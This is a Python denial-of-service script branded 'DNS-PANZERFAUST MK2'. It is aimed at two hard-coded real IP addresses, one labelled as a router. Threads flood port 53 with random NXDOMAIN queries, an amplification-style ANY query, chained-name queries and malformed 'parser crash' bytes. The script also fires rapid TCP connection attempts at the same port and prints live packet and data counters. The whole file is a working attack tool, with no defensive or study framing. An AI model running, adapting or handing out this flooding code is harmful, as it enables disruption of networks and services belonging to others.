import socket
import threading
import time
import random
import struct

# 2x TARGETS
targets = ["62.109.121.42", "62.52.52.26"]  # ROUTER + SECOND TARGET

GREEN = '\033[92m'
RED = '\033[91m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# DNS PANZERFAUST MK2 PAYLOADS
def panzer_payload_1(target):
    """NXDOMAIN BOMBER"""
    domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=15)) + '.com'
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
    query += b'\x00\x00\x01\x00\x01'
    return query

def panzer_payload_2(target):
    """DNS AMPLIFICATION SIMULATION"""
    return b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03isc\x03org\x00\x00\xff\x00\x01'

def panzer_payload_3(target):
    """CNAME CHAIN POISON"""
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 5, 0, 0, 0)
    for i in range(5):
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
        query += struct.pack('B', len(name)) + name.encode()
    query += b'\x00\x00\x05\x00\x01'
    return query

def panzer_payload_4(target):
    """DNS TCP SESSION FLOOD"""
    return b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'

def panzer_payload_5(target):
    """MALFORMED DNS PARSER CRASH"""
    return b'\xff' * 128

PANZER_PAYLOADS = [panzer_payload_1, panzer_payload_2, panzer_payload_3, panzer_payload_4, panzer_payload_5]

# Stats per target
stats = {
    target: {"sent": 0, "data": 0, "success": 0}
    for target in targets
}
lock = threading.Lock()

def panzer_attack(target_ip):
    """PANZERFAUST attack thread per target"""
    while True:
        try:
            payload_func = random.choice(PANZER_PAYLOADS)
            payload = payload_func(target_ip)
            
            # UDP DNS FLOOD
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(150):  # BATCH
                sock.sendto(payload, (target_ip, 53))
                
                with lock:
                    stats[target_ip]["sent"] += 1
                    stats[target_ip]["data"] += len(payload)
                    stats[target_ip]["success"] += 1
            sock.close()
            
            # TCP DNS SYNs
            for _ in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.01)
                    sock.connect_ex((target_ip, 53))
                    sock.close()
                    
                    with lock:
                        stats[target_ip]["sent"] += 1
                        stats[target_ip]["data"] += 64
                except:
                    pass
                    
        except:
            pass
        
        time.sleep(random.uniform(0.01, 0.05))

# Start PANZERFAUST on both targets
for target in targets:
    for _ in range(3):  # 3 threads per target
        threading.Thread(target=panzer_attack, args=(target,), daemon=True).start()

print(f"{MAGENTA}╔══════════════════════════════════════╗{RESET}")
print(f"{MAGENTA}║      {RED}DNS-PANZERFAUST MK2{RESET} {MAGENTA}     ║{RESET}")
print(f"{MAGENTA}║      {CYAN}DUAL TARGET MODE{RESET} {MAGENTA}       ║{RESET}")
print(f"{MAGENTA}╚══════════════════════════════════════╝{RESET}")
print()

last_time = time.time()
while True:
    time.sleep(5)
    
    with lock:
        total_sent = 0
        total_data = 0
        
        print(f"{CYAN}╔══════════════════════════════════════╗{RESET}")
        for i, target in enumerate(targets):
            sent = stats[target]["sent"]
            data_mb = stats[target]["data"] / (1024 * 1024)
            
            total_sent += sent
            total_data += stats[target]["data"]
            
            # Reset for next interval
            stats[target]["sent"] = 0
            stats[target]["data"] = 0
            stats[target]["success"] = 0
            
            color = YELLOW if i == 0 else RED
            print(f"{CYAN}║{RESET} {color}TARGET {i+1}: {target:21}{RESET}{CYAN}║{RESET}")
            print(f"{CYAN}║{RESET} PPS: {GREEN}{sent}{RESET} | DATA: {GREEN}{data_mb:.2f}MB{RESET}      {CYAN}║{RESET}")
        
        total_data_mb = total_data / (1024 * 1024)
        print(f"{CYAN}╠══════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║{RESET} TOTAL: {GREEN}{total_sent}{RESET} | {GREEN}{total_data_mb:.2f}MB{RESET}         {CYAN}║{RESET}")
        print(f"{CYAN}╚══════════════════════════════════════╝{RESET}")
        print()
    
    last_time = time.time()
